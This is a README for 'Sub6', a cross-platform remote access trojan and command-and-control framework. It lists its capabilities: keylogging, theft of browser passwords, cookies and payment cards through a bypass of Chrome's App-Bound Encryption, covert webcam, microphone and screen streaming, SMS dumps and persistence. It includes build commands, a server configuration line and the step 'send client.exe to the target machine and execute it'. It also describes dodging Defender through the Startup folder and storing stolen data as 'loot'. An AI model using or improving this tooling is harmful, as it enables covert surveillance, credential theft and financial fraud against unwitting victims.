# Sub6 - Multi-Platform Remote Access Tool

<p align="center">
  <img src="logo.png" alt="Sub6 Logo" width="200"/>
</p>

<p align="center">
  <b>Cross-platform C2 framework with real-time streaming capabilities</b>
</p>

---

## 🎯 Features

### Multi-Platform Support
- **Windows** - Full-featured client with live streaming, keylogging, and credential extraction
- **Linux** - Screen/webcam streaming, file operations, and persistence
- **Android** - Camera access, SMS/contacts dump, and device information

### Windows Capabilities
| Feature | Description |
|---------|-------------|
| 🖥️ **Live Screen** | Real-time screen streaming (30+ fps, HD quality) |
| 📷 **Live Webcam** | Real-time camera streaming with camera selection |
| 🎤 **Live Audio** | Real-time microphone streaming |
| 🔑 **Credential Extraction** | Chrome/Edge/Brave passwords, cookies, tokens (v20 App-Bound Encryption supported) |
| ⌨️ **Keylogger** | Background keystroke logging |
| 🖱️ **Remote Control** | Mouse movement, clicks, keyboard input |
| 📂 **File Operations** | Upload, download, folder zip download |
| 🎬 **Screen Recording** | Record screen to AVI file |
| 🔒 **Persistence** | Registry-based auto-start |

### Linux Capabilities
- Live screen streaming (scrot + ffmpeg)
- Live webcam streaming
- Live audio streaming (ALSA)
- Browser credential extraction
- File operations
- Persistence via cron/systemd

### Android Capabilities
- Camera photo capture
- SMS/Contacts/Call log dump (root required)
- Installed apps list
- WiFi information
- Device location (root required)

---

## 🚀 Quick Start

### 1. Clone the Repository
```bash
git clone https://github.com/adhikarisubodh9991/sub6-windows-payload.git
cd sub6-windows-payload
```

### 2. Configure the Client

Edit `client_windows.c` and update the server address:
```c
char g_server_host[256] = "YOUR_SERVER_IP_OR_DOMAIN";
char g_server_port[6] = "80";
```

Update the ChromElevator URL (for credential extraction):
```c
char g_chromelevator_url[512] = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/files/chromelevator.exe";
```

### 3. Compile the Client

**Windows (using MinGW):**
```bash
gcc client_windows.c -o client.exe -lws2_32 -lwininet -liphlpapi -lgdi32 -luser32 -lshell32 -lvfw32 -lwinmm -lpsapi -lavifil32 -lavicap32 -lcrypt32 -lbcrypt -mwindows -s -O2
```

**Linux:**
```bash
gcc client_linux.c -o client -lpthread -s -O2
```

**Android (Termux):**
```bash
gcc client_android.c -o client -lpthread -s -O2
```

### 4. Start the Server
```bash
python server.py
```

Or with custom port:
```bash
python server.py --port 8080
```

### 5. Deploy Client
Send `client.exe` to the target machine and execute it.

---

## 📋 Commands

### Server Commands (Before Session)
| Command | Description |
|---------|-------------|
| `sessions` | List all active sessions |
| `session <id>` | Interact with a session |
| `kill <id>` | Terminate a session |
| `help` | Show help menu |
| `exit` | Shutdown server |

### Session Commands (Inside Session)

#### General (All Platforms)
| Command | Description |
|---------|-------------|
| `sysinfo` | System information |
| `screenshot` | Take screenshot |
| `shell` | Interactive shell |
| `ps` | List processes |
| `download <file>` | Download file |
| `upload <file>` | Upload file |
| `cmd <command>` | Execute command |
| `cd <path>` | Change directory |
| `persist` | Install persistence |
| `unpersist` | Remove persistence |
| `background` | Return to server |
| `exit` | Close session |

#### Windows Only
| Command | Description |
|---------|-------------|
| `liveview [fps] [quality]` | Live screen (default: 30fps 80%) |
| `stoplive` | Stop live screen |
| `camview [fps] [quality]` | Live webcam (default: 30fps 80%) |
| `stopcam` | Stop live webcam |
| `liveaudio [rate]` | Live microphone (default: 22050Hz) |
| `stopaudio` | Stop live audio |
| `listcam` | List cameras |
| `selectcam <n>` | Select camera |
| `camshot` | Take webcam photo |
| `soundrecord [seconds]` | Record audio (1-300s) |
| `startrecord` | Start screen recording |
| `stoprecord` | Stop screen recording |
| `getrecord` | Download recording |
| `mousemove <x> <y>` | Move mouse |
| `click` | Left click |
| `rightclick` | Right click |
| `sendkeys <text>` | Send keystrokes |
| `browsercreds` | Extract browser credentials |
| `keylogs` | Download keylogger |
| `clearlogs` | Clear keylogger |
| `downloadfolder <dir>` | Download folder as zip |

---

## 🔐 Browser Credential Extraction

The tool uses **ChromElevator** to bypass Chrome's v20 App-Bound Encryption (Chrome 127+).

### What it Extracts:
- ✅ Passwords (all saved logins)
- ✅ Cookies (session cookies, auth tokens)
- ✅ Payment cards
- ✅ OAuth tokens
- ✅ IBANs

### Supported Browsers:
- Google Chrome
- Microsoft Edge
- Brave Browser

### How it Works:
1. Downloads `chromelevator.exe` to the Startup folder
2. Runs extraction (bypasses Defender via Startup folder exclusion)
3. Sends extracted JSON files to server
4. Cleans up (deletes exe and output folder)

---

## 📁 File Structure

```
sub6-windows-payload/
├── client_windows.c    # Windows client source
├── client_linux.c      # Linux client source
├── client_android.c    # Android client source
├── client.exe          # Compiled Windows client
├── server.py           # C2 server
├── compile             # Compilation instructions
├── logo.png            # Project logo
├── files/
│   └── chromelevator.exe  # Chrome credential extractor
└── loot/
    ├── screenshots/    # Captured screenshots
    ├── downloads/      # Downloaded files
    ├── webcam/         # Webcam captures
    └── audio/          # Audio recordings
```

---

## ⚙️ Requirements

### Server
- Python 3.8+
- websockets (`pip install websockets`)
- Pillow (`pip install Pillow`)

### Windows Client Compilation
- MinGW-w64 or MSYS2

### Linux Client Compilation
- GCC
- pthread library

---

## 🔧 Troubleshooting

### Client not connecting?
1. Check firewall allows the port (default: 80)
2. Verify server IP/domain in client source
3. Ensure server is running before client

### Credential extraction fails?
1. Make sure `chromelevator.exe` is in your repo's `files/` folder
2. Update `g_chromelevator_url` with correct raw GitHub link
3. Chrome/Edge must be closed during extraction

### Live streaming laggy?
- Increase FPS: `liveview 60 90`
- Default is 30fps at 80% quality
- Higher quality = more bandwidth needed

---

## ⚠️ Disclaimer

This tool is for **educational and authorized security testing purposes only**. Unauthorized access to computer systems is illegal. The author is not responsible for any misuse of this software.

---

## 📜 License

This project is provided as-is for educational purposes.

---

<p align="center">
  <b>Made with ❤️ by Sub6 Team</b>
</p>
